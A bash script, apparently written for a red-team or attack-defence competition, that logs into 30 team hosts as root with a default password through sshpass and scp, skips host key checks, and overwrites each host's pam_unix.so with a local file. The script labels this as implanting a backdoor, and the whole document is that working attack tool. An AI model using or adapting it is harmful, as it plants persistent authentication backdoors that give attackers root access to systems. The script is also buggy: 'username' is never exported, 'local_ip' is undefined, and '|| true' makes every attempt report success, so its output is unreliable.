#!/bin/bash

IPs=()
network_id="1.1"
number_of_teams=10
host_ids=(1 2 3)

username="root"
password="password"

timeout=5
path_to_pam="/lib/x86_64-linux-gnu/security"
local_pam_file="/tmp/pam_unix.so"

create_IPs() {
    for ((team=1; team<=number_of_teams; team++)); do
        for host_id in "${host_ids[@]}"; do
            IPs+=("$network_id.$team.$host_id")
        done
    done
}

main() {
    create_IPs
    export password timeout path_to_pam local_pam_file

    printf "%s\n" "${IPs[@]}" | xargs -P 20 -n1 -I {} bash -c '
        IP="{}"
        sshpass -p "$password" scp -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout "$local_pam_file" "$username@$IP:$path_to_pam/pam_unix.so" || true

        if [ $? -eq 0 ]; then
            echo "Successfully implanted backdoor at $local_ip"
        else
            echo "Failed to implant backdoor at $local_ip"
        fi
    '
}

main
